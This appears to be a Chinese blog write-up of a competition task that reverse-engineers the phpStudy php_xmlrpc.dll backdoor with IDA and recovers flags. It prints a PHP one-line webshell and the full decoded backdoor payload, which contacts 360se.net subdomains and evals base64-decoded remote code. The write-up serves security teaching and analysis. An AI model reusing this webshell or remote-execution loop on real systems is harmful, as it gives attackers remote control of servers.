@@ -1,0 +1,191 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="markdown_views prism-atom-one-light" id="content_views">
+<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
+<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+</svg>
+<h1><a id="_0"></a>简介</h1>
+<p>需要工具和环境的可以加群809706080，有什么不会的也可以在里面提问，我看到会第一时间回答</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0b412ae16be24b61be4515ee22446a33.png"/></p>
+<h1><a id="1%091RCEBackdoorzipIDAFlag0x1000XXXX0x1000XXXX_6"></a>1. 找出靶机桌面上文件夹1中的文件RCEBackdoor.zip，使用静态反编译工具IDA对该压缩包中的程序进行分析，根据提示来分析目标文件，将包含恶意代码基址偏移的范围作为Flag值提交（提交形式：0x1000XXXX-0x1000XXXX）；</h1>
+<p>进入桌面后，解压文件，可以看到有以下文件</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/605fc421ac4d4d419b68d629a91588df.png"/></p>
+<p>通过我朋友雨泽的中间件漏洞文章和这个php的版本，可以猜到这题考的是前几年phpstudy的后门漏洞</p>
+<p>雨泽的文章链接：https://blog.csdn.net/liufdfd/article/details/125507247?spm=1001.2014.3001.5501</p>
+<p>phpstudy的后门漏洞大部分存在于：</p>
+<pre><code>phpStudy20180211版本 php5.4.45与php5.2.17 ext扩展文件夹下的php_xmlrpc.dll
+phpStudy20161103版本 php5.4.45与php5.2.17 ext扩展文件夹下的php_xmlrpc.dll
+</code></pre>
+<p>我们打开这个文件目录找到后门文件</p>
+<p><img alt="" src="image\098fa80c28974854832117d78a79673a.png"/></p>
+<p>然后将文件拖入ida pro 分析</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c546584e49244303acec7b00e60b8a2c.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/000d826c2a4c49cf8683926d2bfba37f.png"/></p>
+<p>我们按shift+f12可以显示出文件内的字符串，在下面可以发现这两个奇怪的字符串</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7330050174b2468a86d7265c35e5690c.png"/></p>
+<p>这个是常用的php小马代码</p>
+<pre><code>&lt;?php @eval($_POST['cmd']);?&gt;
+</code></pre>
+<p>可以判断，这个字符串就是后门代码</p>
+<p>接下来我们交叉引用，跳转到执行这个代码的段，我们双击这个字符串</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/37177896686c4f2ca7e27d02317ad1f0.png"/></p>
+<p>双击这个地方，跳转到执行代码的地方</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/91bf6f711722459b9acb0817ca77bfa9.png"/></p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/acd9969570fe48e19770e28710f3a086.png"/></p>
+<p>这就是代码执行的地方，我们可以按f5看一下这个段的伪代码</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/67ac0afcd58c4ca1a703601bc69e8794.png"/></p>
+<p>根据题目，将包含恶意代码基址偏移的范围作为Flag值提交，</p>
+<p>我们通过从恶意代码执行的地方往上逆向分析，在这个while循环可以发现</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7ebdadd412e94b0eafc4f3ea9b1fc93f.png"/></p>
+<p>从最下面的恶意代码执行的伪代码跟着我的思路走</p>
+<pre><code>    v10 = &amp;byte_10011B34;
+    v11 = asc_1000C028;
+    v41 = &amp;byte_10011B34;
+    v12 = 0;
+    v13 = asc_1000C028;
+    while ( 1 )
+    {
+      if ( *(_DWORD *)v13 == 39 )
+      {
+        v10[v12] = 92;
+        v41[v12 + 1] = *v11;    //v41获取了v11变量的内存地址
+        v12 += 2;
+        v13 += 8;
+      }
+      else
+      {
+        v10[v12++] = *v11;
+        v13 += 4;
+      }
+      v11 += 4;
+      if ( (int)v11 &gt;= (int)&amp;unk_1000C66C )   //如果v11变量里的值大于1000C66C内存地址里的值
+        break;
+      v10 = v41;   //v10变量=v41变量
+    }
+    spprintf(&amp;v41, 0, "@eval(%s('%s'));", aGzuncompress, v41);     //将@eval(%s('%s'));字符串和aGzuncompress里的值存入V41变量里
+</code></pre>
+<p>我只分析了一下关键地方的代码，其他地方的代码不怎么重要，在分析里可以知道，关键的偏移地址是V11里的值和if对比的1000C66C内存地址里的值</p>
+<h2><a id="Flag_96"></a>将包含恶意代码基址偏移的范围作为Flag值提交</h2>
+<pre><code>0x1000C028-0x1000C66C
+</code></pre>
+<h1><a id="2%09Flagecho_101"></a>2. 继续分析反汇编后代码，找出在恶意代码中的关键函数，将用于字符串拼接的函数名称作为Flag值提交；（提交形式：echo()）</h1>
+<p>这个就简单多了，我们继续在ida里分析</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2c85705307aa45e4948df392dac012f1.png"/></p>
+<p>可以发现，拼接字符串函数名称是</p>
+<pre><code>spprintf
+</code></pre>
+<h1><a id="3%09Flag_112"></a>3. 继续分析反汇编后代码，找出在恶意代码中的关键函数，将用于格式化字符串的参数名称作为Flag值提交；（提交形式：%*）</h1>
+<p>恶意代码如下</p>
+<pre><code>@eval(%s('%s'));
+</code></pre>
+<p>由此可知，用于格式化字符串的参数名称是</p>
+<pre><code>%s
+</code></pre>
+<h1><a id="4%09Flag_122"></a>4. 继续分析反汇编后代码，找出在恶意代码中的关键函数，将用于字符串传参的参数名称作为Flag值提交；（提交形式：%*）</h1>
+<p>通过上面的恶意代码和学过c语言的都知道，字符串传参的参数名称是</p>
+<pre><code>%s
+</code></pre>
+<h1><a id="5%09Windows71decodepyF1F2F3F4Flag_128"></a>5. 找出靶机Windows7桌面上文件夹1中的decode.py文件并完善此文件，填写该文件当中空缺的F1、F2、F3、F4四个字符串，将四个字符串拼接后的内容作为Flag值提交</h1>
+<p>我们打开decode.py文件</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/094bfb09fcd34c9f839dfb01062931da.png"/></p>
+<p>关键的f1,f2,f3,f4代码：</p>
+<pre><code>data = zlib.F1(data)
+flag = b'F2'
+hwrite.write(F3)
+hwrite.write(F4)
+#Flag=F1.F2.F3.F4
+</code></pre>
+<p>F1是python的zlib模块里的函数</p>
+<p>F1：</p>
+<pre><code>decompress
+</code></pre>
+<p>F2是程序aGzuncompress变量里的值</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b96dcee0e90d40f3abefa6977267d1d0.png"/></p>
+<p>我们双击这个变量进入查看</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/70f149e6f350425d92bde540fafb0a03.png"/></p>
+<p>F2：</p>
+<pre><code>gzuncompress
+</code></pre>
+<p>通过这段代码分析</p>
+<pre><code>flag = b'F2'
+		offset = data.find(flag)
+		data = data[offset + 0x10:offset + 0x10 + 0x567*4].replace(b"\x00\x00\x00",b"")
+		decodedata_1 = zlib.F1(data[:0x191])
+		print(hexdump(data[0x191:]))
+		decodedata_2 = zlib.F1(data[0x191:])
+		with open("compres_data1.txt","w") as hwrite:
+			hwrite.write(F3)
+			hwrite.close
+		with open("compres_data2.txt","w") as hwrite:
+			hwrite.write(F4)
+			hwrite.close
+</code></pre>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ee2f6409b9014cad9078d2f85e53d37f.png"/></p>
+<p>F3和F4分别为：</p>
+<pre><code>str(decodedata_1)和str(decodedata_2)
+</code></pre>
+<p>完整的flag为：</p>
+<pre><code>decompress.gzuncompress.str(decodedata_1).str(decodedata_2)
+</code></pre>
+<h1><a id="6%09decodepyFlag21222380_190"></a>6. 执行decode.py后将生产两个文件，对第二个文件中内容进行分析并解码，将其中出现的端口列表中的所有端口号一招从小到大的顺序依次排列作为Flag值（如：21,22,23,80）提交；</h1>
+<p>我们填补完程序缺失的代码后执行</p>
+<p>从生成的第二个文件里可以发现</p>
+<pre><code>@ini_set("display_errors","0");
+    error_reporting(0);
+    function tcpGet($sendMsg = '', $ip = '360se.net', $port = '20123'){
+        $result = "";
+      $handle = stream_socket_client("tcp://{$ip}:{$port}", $errno, $errstr,10);
+      if( !$handle ){
+        $handle = fsockopen($ip, intval($port), $errno, $errstr, 5);
+        if( !$handle ){
+            return "err";
+        }
+      }
+      fwrite($handle, $sendMsg."\n");
+        while(!feof($handle)){
+            stream_set_timeout($handle, 2);
+            $result .= fread($handle, 1024);
+            $info = stream_get_meta_data($handle);
+            if ($info['timed_out']) {
+              break;
+            }
+         }
+      fclose($handle);
+      return $result;
+    }
+    $ds = array("www","bbs","cms","down","up","file","ftp");
+    $ps = array("20123","40125","8080","80","53");
+    $n = false;
+    do {
+        $n = false;
+        foreach ($ds as $d){
+            $b = false;
+            foreach ($ps as $p){
+                $result = tcpGet($i,$d.".360se.net",$p);
+                if ($result != "err"){
+                    $b =true;
+                    break;
+                }
+            }
+            if ($b)break;
+        }
+        $info = explode("&lt;^&gt;",$result);
+        if (count($info)==4){
+            if (strpos($info[3],"/*Onemore*/") !== false){
+                $info[3] = str_replace("/*Onemore*/","",$info[3]);
+                $n=true;
+            }
+            @eval(base64_decode($info[3]));
+        }
+    }while($n);
+</code></pre>
+<p>端口号从小到大的顺序为：</p>
+<pre><code>53,80,8080,20123,40125
+</code></pre>
+<h1><a id="poc_248"></a>poc利用</h1>
+<p>可以看雨泽写的文章，也是全国中职网络安全B模块的题，叫做中间件渗透测试</p>
+<pre><code>https://blog.csdn.net/liufdfd/article/details/125507247?spm=1001.2014.3001.5502
+</code></pre>
+</div>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
+</div>
